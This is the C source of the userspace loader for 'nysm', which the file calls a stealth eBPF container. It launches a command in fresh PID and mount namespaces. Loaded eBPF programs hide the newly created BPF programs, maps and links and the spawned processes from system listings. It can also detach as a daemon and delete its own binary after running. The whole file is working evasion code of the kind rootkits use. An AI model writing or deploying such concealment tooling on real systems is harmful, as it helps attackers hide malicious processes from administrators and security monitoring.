#define _GNU_SOURCE
#include <signal.h>
#include <sys/resource.h>
#include <stdint.h>
#include <bpf/bpf.h>
#include <sched.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <argp.h>
#include "nysm.skel.h"
#define COLOR_CYAN       "\x1b[36m"
#define COLOR_GREEN      "\x1b[32m"
#define COLOR_RST        "\x1b[0m"
#define DEFAULT_CMD      "/bin/bash"
#define DEFAULT_DETACH   0
#define DEFAULT_RM       0
#define DEFAULT_VERBOSE  0

static volatile sig_atomic_t sig_rcv;

const char *argp_program_bug_address = "@eeriedusk";

static char doc[] = "Stealth eBPF container.\n";
static char args_doc[] = "COMMAND";
static char usage[] = "Usage: nysm [-d] [-r] [-v] COMMAND\n";

static struct argp_option options[] = {
    {"help"   , 'h', 0, 0, "Display this help"            , -1},
    {"usage"  ,  -1, 0, 0, "Display a short usage message", 0},
    {"detach" , 'd', 0, 0, "Run COMMAND in background"    , 1},
    {"rm"     , 'r', 0, 0, "Self destruct after execution", 2},
    {"verbose", 'v', 0, 0, "Produce verbose output"       , 3},
    { 0 }
};

struct arguments {
    int  cmd;
    int  detach;
    int  rm;
    int  verbose;
};

static error_t parse_opt(int key, char *arg, struct argp_state *state) {
    struct arguments *arguments = state->input;

    switch (key) {
        case 'h':
            argp_state_help(state, state->out_stream, ARGP_HELP_STD_HELP);
            break;
        case -1:
            printf("%s", usage);
            argp_state_help(state, state->out_stream, ARGP_HELP_EXIT_OK);
            break;
        case 'd':
            arguments->detach = 1;
            break;
        case 'r':
            arguments->rm = 1;
            break;
        case 'v':
            arguments->verbose = 1;
            break;
        case ARGP_KEY_ARG:
            if (!arguments->cmd) {
                arguments->cmd = state->next - 1;
            }
            state->next = state->argc;
            break;
        case ARGP_KEY_END:
            if (!arguments->cmd) {
                argp_error(state, "Missing COMMAND");
            }
            break;
        default:
            return ARGP_ERR_UNKNOWN;
    }

    return 0;
}

void sig_handler(int signo){
    sig_rcv = 1;
}

static void bpf_list_object(int (*object_func)(uint32_t, uint32_t*), uint32_t *id) {
    uint32_t index   = 0;
    uint32_t next_id = 0;

    while (true) {
        if (object_func(next_id, &next_id)) break;
        id[index] = next_id;
        index++;
    }
}

static void bpf_hide_diff_object(int map_fd, int (*object_func)(uint32_t, uint32_t*), uint32_t *id_old) {
    uint32_t index   = 0;
    uint32_t next_id = 0;

    while (true) {
        if (object_func(next_id, &next_id)) break;
        if (id_old[index] != next_id) {
            bpf_map_update_elem(map_fd, &next_id, &next_id, BPF_ANY);
        }
        index++;
    }
}

int run_ebpf(uint32_t pid, uint32_t ppid) {
    struct nysm_bpf *nysm = 0;
    struct stat     st    = {};
    uint32_t prog_ids[1024] = {},
             map_ids[1024]  = {},
             link_ids[1024] = {};
    char     pidns_path[64] = {};

    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    signal(SIGINT , sig_handler);
    signal(SIGTERM, sig_handler);

    // List current objects
    bpf_list_object(bpf_prog_get_next_id, prog_ids);
    bpf_list_object(bpf_map_get_next_id , map_ids);
    bpf_list_object(bpf_link_get_next_id, link_ids);

    // Open BPF program
    nysm = nysm_bpf__open();
    if (!nysm) goto cleanup;

    // Load program
    int32_t err = nysm_bpf__load(nysm);
    if (err) goto cleanup;

    snprintf(pidns_path, sizeof(pidns_path), "/proc/%d/ns/pid", pid+1);
    if(stat(pidns_path, &st)) goto cleanup;

    nysm->bss->pidns = st.st_ino;

    int32_t index = 1;
    int32_t prog = bpf_program__fd(nysm->progs.tracepoint_getdents64_exit);
    int32_t ret = bpf_map_update_elem(bpf_map__fd(nysm->maps.map_getdents64_recursive_tail_call), &index, &prog, BPF_ANY);
    if (ret == -1) goto cleanup;

    // Attach program
    err = nysm_bpf__attach(nysm);
    if (err) goto cleanup;

    // Hide new objects
    bpf_hide_diff_object(bpf_map__fd(nysm->maps.map_security_bpf_prog_id_data), bpf_prog_get_next_id, prog_ids);
    bpf_hide_diff_object(bpf_map__fd(nysm->maps.map_security_bpf_map_id_data) , bpf_map_get_next_id , map_ids);
    bpf_hide_diff_object(bpf_map__fd(nysm->maps.map_bpf_link_prime_id_data)   , bpf_link_get_next_id, link_ids);

    bpf_map_update_elem(bpf_map__fd(nysm->maps.map_alloc_pid_pid_data), &ppid, &ppid, BPF_ANY);
    for (int i=0;i<3;i++) {
        bpf_map_update_elem(bpf_map__fd(nysm->maps.map_alloc_pid_pid_data), &pid, &pid, BPF_ANY);
        pid++;
    }

    kill(1, SIGCONT);

    while (!sig_rcv) {
        sleep(1);
    }

cleanup:
    nysm_bpf__destroy(nysm);
    return -err;
}

static void start_daemon() {
    setsid();

    umask(0);

    close(0);
    close(1);
    close(2);

    int fd0 = open("/dev/null", O_RDWR);
    if (fd0 != 0) exit(1);
    int fd1 = dup(fd0);
    if (fd1 != 1) exit(1);
    int fd2 = dup(fd0);
    if (fd2 != 2) exit(1);
};

int main(int argc, char *argv[]) {
    struct arguments arguments = {};
    struct argp argp           = { options, parse_opt, args_doc, doc };
    uint32_t pid  = getpid(),
             ppid = getppid(),
             f1   = 0,
             f2   = 0;

    arguments.detach  = DEFAULT_DETACH;
    arguments.rm      = DEFAULT_RM;
    arguments.verbose = DEFAULT_VERBOSE;

    argp_parse(&argp, argc, argv, ARGP_NO_HELP | ARGP_IN_ORDER, 0, &arguments);

    unshare(CLONE_NEWNS | CLONE_NEWPID);

    f1 = fork();
    if (f1 == 0) {
        if (arguments.detach) {
            start_daemon();
        }
        signal(SIGCONT, sig_handler);
        while (!sig_rcv) {
            sleep(1);
        }
        return execvp(argv[arguments.cmd], argv+arguments.cmd);
    }
    if (arguments.verbose) {
        printf(COLOR_CYAN"[NYSM] "COLOR_RST"Forked PID %d for command.\n", f1);
    }

    f2 = fork();
    if (f2 == 0) {
        start_daemon();
        return run_ebpf(pid, ppid);
    }
    if (arguments.verbose) {
        printf(COLOR_CYAN"[NYSM] "COLOR_RST"Forked PID %d for eBPF.\n", f2);
    }

    signal(SIGINT, SIG_IGN);

    if (arguments.rm) {
        remove(argv[0]);
        if (arguments.verbose) {
            printf(COLOR_CYAN"[NYSM] "COLOR_RST"Removed nysm.\n");
        }
    }

    if (!arguments.detach) {
        if (arguments.verbose) {
            printf(COLOR_CYAN"[NYSM] "COLOR_RST"Waiting for command to be done...\n");
        }
        wait(NULL);
    }

    if (arguments.verbose) {
        printf(COLOR_CYAN"[NYSM] "COLOR_GREEN"Done!\n"COLOR_RST);
    }

    return 0;
}

